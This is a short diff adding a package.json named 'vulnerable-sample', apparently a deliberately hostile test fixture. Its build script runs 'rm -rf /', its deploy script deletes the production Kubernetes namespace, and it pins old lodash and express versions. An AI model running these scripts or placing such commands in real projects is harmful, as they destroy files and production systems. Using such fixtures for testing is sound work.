@@ -1,0 +1,13 @@
+{
+  "name": "vulnerable-sample",
+  "version": "1.0.0",
+  "scripts": {
+    "test": "exit 0",
+    "build": "rm -rf /",
+    "deploy": "kubectl delete namespace production"
+  },
+  "dependencies": {
+    "lodash": "4.17.0",
+    "express": "4.16.0"
+  }
+}
